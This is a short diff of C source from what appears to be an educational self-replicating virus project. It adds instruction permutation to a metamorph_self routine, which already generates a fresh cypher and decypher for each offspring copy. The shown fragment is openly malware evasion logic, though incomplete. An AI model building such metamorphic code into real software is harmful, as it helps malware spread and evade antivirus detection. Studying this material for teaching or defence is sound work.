@@ -6,7 +6,7 @@
 /*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
-/*   Updated: 2019/12/13 21:51:22 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/14 18:32:03 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -33,13 +33,18 @@
 **   (3)    father[n, p] and son[p + 1, m] with n < p < m
 **
 */
+
+void		return_to_client(void);
+
 bool		metamorph_self(uint64_t seed[2], uint64_t son_seed[2])
 {
-	size_t cypher_size = (size_t)cypher_end - (size_t)cypher;
+	size_t	cypher_size = (size_t)cypher_end - (size_t)cypher;
+	size_t	loader_size = return_to_client - famine_entry; // tmp size
 
 	if (!yield_seed_to_heir(seed, son_seed)
 	|| !generate_cypher((void *)cypher, son_seed[0], cypher_size)
 	|| !generate_decypher((void *)decypher, son_seed[0], cypher_size)
+	|| !permutate_instructions(famine_entry, loader_size)
 	|| !true) // add more metamorphosis above!
 		return errors(ERR_THROW, 'm', '1');
 	return true;
